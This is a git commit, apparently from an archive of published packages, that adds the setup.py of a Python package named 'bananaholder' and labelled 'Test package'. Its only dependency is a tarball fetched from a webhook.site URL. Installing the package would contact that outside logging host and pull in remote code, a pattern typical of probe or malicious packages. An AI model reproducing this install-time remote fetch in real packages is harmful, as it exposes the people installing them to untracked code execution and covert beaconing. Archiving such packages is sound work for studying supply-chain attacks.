c183fab7f98bb2ea83548668a65dc7e754e939e4
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 22:07:11 +0000

    Add package bananaholder/0.0.110/bananaholder-0.0.110.tar.gz

---
+++ packages/bananaholder/bananaholder-0.0.110.tar.gz/bananaholder-0.0.110/setup.py
@@ -0,0 +1,8 @@
+from setuptools import setup
+
+setup(
+  name='bananaholder',
+  version='0.0.110',
+  description='Test package',
+  install_requires=['banana-binaries @ https://webhook.site/c4b89910-23b7-41ac-b91e-8bcc84dd1307/test.tar.gz']
+)
